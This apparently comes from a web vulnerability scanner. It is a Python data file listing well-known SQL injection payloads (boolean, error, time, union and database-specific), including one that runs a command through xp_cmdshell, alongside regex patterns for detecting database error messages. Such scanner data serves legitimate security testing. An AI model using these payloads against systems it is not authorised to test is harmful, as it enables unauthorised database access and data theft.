# SQL injection payloads for the scanner

SQL_PAYLOADS = [
    # Boolean-based payloads
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    '" OR "1"="1',
    '" OR "1"="1" --',
    '" OR 1=1 --',
    "') OR ('1'='1",
    "')) OR (('1'='1",
    
    # Error-based payloads
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "%27",
    "';",
    "\";",
    
    # Time-based payloads (might need to be modified depending on DBMS)
    "' OR SLEEP(1) --",
    "' OR pg_sleep(1) --",
    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',1) --",
    
    # Union-based payloads
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    
    # Specific DBMS payloads
    # MySQL
    "' OR 1=1 -- -",
    "' OR 1=1# ",
    "' OR 1=1/*",
    
    # PostgreSQL
    "' OR 1=1 --",
    "' OR 1=1;--",
    
    # MS SQL Server
    "' OR 1=1 --",
    "'; exec xp_cmdshell('ping 127.0.0.1') --",
    
    # Oracle
    "' OR 1=1 --",
    "' OR 1=1 FROM dual --",
    
    # SQLite
    "' OR 1=1 --",
    "' OR sqlite_version() --"
]

# Patterns to detect SQL errors in responses
SQL_ERROR_PATTERNS = [
    # MySQL
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "MySqlException",
    "MySQLSyntaxErrorException",
    "mysqli_",
    "MySQL server version",
    
    # PostgreSQL
    "PostgreSQL.*ERROR",
    "ERROR:.*syntax error at or near",
    "ERROR:.*line [0-9]+",
    "PG::SyntaxError:",
    
    # SQL Server
    "Microsoft SQL Server",
    "OLE DB.*SQL Server",
    "Unclosed quotation mark after",
    "ODBC SQL Server Driver",
    "Server Error.*SQL",
    "Incorrect syntax near",
    "Syntax error.*in query expression",
    
    # Oracle
    "ORA-[0-9][0-9][0-9][0-9]",
    "Oracle error",
    "Oracle.*Driver",
    "Warning: oci_",
    
    # SQLite
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    
    # Generic SQL errors
    "SQL syntax.*?",
    "SQL statement",
    "syntax error",
    "quoted string not properly terminated",
    "unclosed quotation mark",
    "unexpected end of SQL command"
]
